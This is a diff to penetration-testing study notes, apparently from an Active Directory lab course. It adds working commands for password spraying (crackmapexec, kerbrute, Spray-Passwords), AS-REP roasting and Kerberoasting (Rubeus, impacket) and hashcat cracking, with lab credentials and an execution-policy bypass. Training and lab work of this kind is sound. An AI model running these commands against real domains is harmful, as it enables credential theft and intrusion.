@@ -2286,7 +2286,8 @@ Reference
    CN=jen,CN=Users,DC=corp,DC=com
    ```
 - PowerView
-  - Importing PowerView to memory  `PS C:\Tools> Import-Module .\PowerView.ps1`  
+  - Importing PowerView to memory  
+    `PS C:\Tools> Import-Module .\PowerView.ps1`  
   - Obtaining domain information  
     `PS C:\Tools> Get-NetDomain`
   - Querying users in the domain  
@@ -2434,12 +2435,71 @@ Reference
     `PS C:\Users\jeff> dir \\web04.corp.com\backup`  //backup_schemata.txt
   - Extracting Kerberos tickets with mimikatz > Ticket Granting Service, Ticket Granting Ticket  
     `mimikatz # sekurlsa::tickets`
-  - dd
-  - ddd 
-  - dd
 - Password attacks
+  - review policy of user jeff > Lockout threshold, Lockout duration  
+    `PS C:\Users\jeff> net accounts`
+  - Authenticating using DirectoryEntry
+    ```
+    PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+    $PDC = ($domainObj.PdcRoleOwner).Name
+    $SearchString = "LDAP://"
+    $SearchString += $PDC + "/"
+    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+    $SearchString += $DistinguishedName
+    New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+    ```
+  - **Spray-Passwords** to attack user accounts > **Users guessed are**
+    ```
+    PS C:\Users\jeff> cd C:\Tools
+    PS C:\Tools> powershell -ep bypass
+    PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+    ```
+  - **crackmapexec** to attack user accounts > [+] corp.com\jen:Nexus123!
+    ```
+    kali@kali:~$ cat users.txt
+    dave
+    jen
+    pete
+
+    kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+    ```
+  - Crackmapexec output indicating that the valid credentials have administrative privileges on the target > (Pwn3d!)
+    ```
+    kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com  
+    ```
+  - **kerbrute** to attack user accountsm > **[+] VALID LOGIN**
+    ```
+    PS C:\Tools> notepad usernames.txt
+    dave
+    jen
+    pete
+
+    PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+    ```
 - AS-REP roasting
-- Kerberoasting
+  - Find Vulnerable Users Does not require Kerberos preauthentication > dave  
+    `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
+  - Obtain correct mode for hashcat >  18200 | Kerberos 5, etype 23, AS-REP  
+    `kali@kali:~$ hashcat --help | grep -i "Kerberos"`
+  - Cracking the AS-REP hash with **Hashcat** > Flowers1  
+    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - Using **Rubeus** to obtain the AS-REP hash of dave  
+    `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`  copy the output to hashes.asreproast2  
+    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+- Kerberoasting > SamAccountName, Hash written to C:\Tools\hashes.kerberoast
+  - Decrypt the service ticket (SPN's password hash)
+  - Utilizing **Rubeus** to perform a Kerberoast attack  
+    `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  
+  - copy hashes.kerberoast to our Kali machine  
+  - Reviewing the correct Hashcat mode  >  13100 | Kerberos 5, etype 23, TGS-REP   
+    `kali@kali:~$ hashcat --help | grep -i "Kerberos"`
+  - Cracking the TGS-REP hash > Strawberry1  
+    `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+  - Using **impacket-GetUserSPNs** to perform Kerberoasting on Linux > successfully obtained the TGS-REP hash  
+    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
+  - Note: If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
+  - store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat  
+    `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 - Silver tickets
 - Domain controller synchronization
   
